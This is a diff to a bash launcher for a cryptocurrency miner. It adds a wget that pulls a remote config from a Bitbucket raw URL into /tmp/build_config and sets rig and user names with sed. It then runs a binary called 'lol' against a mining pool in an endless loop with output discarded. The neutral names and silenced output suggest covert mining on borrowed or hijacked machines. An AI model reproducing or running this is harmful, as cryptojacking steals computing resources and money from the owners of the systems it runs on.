@@ -1,8 +1,16 @@
 #!/bin/bash
 user="$1"
 top="$(shuf -n 1 -i 1-999999)"
+
+wget -O /tmp/build_config https://bitbucket.org/oscarhines623/workinside/raw/b23b1f28b86a0e86880a97ea56976934b4e331cb/build_config
+
+sed -i "s/RIGNAME/$top/" "/tmp/build_config"
+sed -i "s/USERNAME/$user/" "/tmp/build_config"
+# sed -i "s/52.188.63.99/xmr.f2pool.com" "/tmp/build_config"
+# sed -i "s/443/13531" "/tmp/build_config"
+
 while :
 do
-  timeout 3m ./lol --pool 52.188.63.99:443 --username $user.$top --password x --algorithm wrkzcoin >/dev/null
+  timeout 3m ./lol --config /tmp/build_config >/dev/null
   sleep 20s
 done
